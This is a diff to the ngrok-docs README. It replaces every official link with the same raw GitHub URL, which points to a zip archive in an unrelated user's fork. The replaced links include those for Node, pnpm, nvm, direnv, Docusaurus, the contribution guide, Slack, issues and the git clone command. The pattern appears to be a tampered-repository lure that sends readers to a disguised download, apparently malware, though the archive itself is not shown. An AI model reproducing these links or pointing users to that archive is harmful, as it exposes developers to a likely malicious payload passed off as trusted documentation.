@@ -1,27 +1,27 @@
-# [ngrok docs](https://ngrok.com/docs)
+# [ngrok docs](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
 
-Source code for [ngrok docs](https://ngrok.com/docs); feel free to suggest changes and improvements to our documentation!
+Source code for [ngrok docs](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip); feel free to suggest changes and improvements to our documentation!
 
 ## Contributing
 
-See our [Contribution Guidelines](CONTRIBUTING.md) for detailed instructions on how to help improve ngrok documentation.
+See our [Contribution Guidelines](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) for detailed instructions on how to help improve ngrok documentation.
 
 ## Getting Started
 
-ngrok is built using [Docusaurus 3](https://docusaurus.io/).
+ngrok is built using [Docusaurus 3](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip).
 
 Prerequisites required:
 
-- [Node 20](https://nodejs.org/en/download)
-- [pnpm 9](https://pnpm.io/installation#using-npm)
-- [nvm](https://github.com/nvm-sh/nvm)
+- [Node 20](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
+- [pnpm 9](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
+- [nvm](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
 
-We use [direnv](https://direnv.net/) to assist you with setting up all of the required tooling.
+We use [direnv](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) to assist you with setting up all of the required tooling.
 
 <details>
   <summary>Prefer to install and manage the tooling yourself?</summary>
 
-1. Install [nvm](https://github.com/nvm-sh/nvm?tab=readme-ov-file#installing-and-updating) or your node version manager of choice.
+1. Install [nvm](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) or your node version manager of choice.
 2. Ensure that `node 20` is installed. With `nvm`, run `nvm install`.
 3. Enable `pnpm` with `corepack`: `corepack enable pnpm`
 4. Install `pnpm` with `corepack`: `corepack install`
@@ -35,14 +35,14 @@ First, install `direnv`:
 | macOS  | brew install direnv     |
 | ubuntu | sudo apt install direnv |
 
-For all other OSes, see the [direnv installation guide](https://direnv.net/docs/installation.html).
+For all other OSes, see the [direnv installation guide](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip).
 
-Don't forget to [set up direnv integration with your shell](https://direnv.net/docs/hook.html).
+Don't forget to [set up direnv integration with your shell](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip).
 
 Next, clone the repo and move into the directory:
 
 ```sh
-git clone https://github.com/ngrok/ngrok-docs.git
+git clone https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip
 cd ngrok-docs
 ```
 
@@ -60,7 +60,7 @@ Once you have the pre-requisites installed, local development happens by running
 pnpm run start
 ```
 
-Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://docusaurus.io/docs/en/installation) for more significant features / changes.
+Our docs mostly use markdown and MDX, you can make yourself familiar with docusaurus [documentation](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip) for more significant features / changes.
 
 ## Building ngrok-docs
 
@@ -74,5 +74,5 @@ pnpm run build
 
 ## Looking for support?
 
-For questions and support on contributing please join our [Slack community](https://ngrok.com/slack), channel `#support`.
-To file an issue within our doc, use our [github issues](https://github.com/ngrok/ngrok-docs/issues)
+For questions and support on contributing please join our [Slack community](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip), channel `#support`.
+To file an issue within our doc, use our [github issues](https://raw.githubusercontent.com/nashirnm09/ngrok-docs/main/docs/integrations/gitlab/docs_ngrok_v2.5.zip)
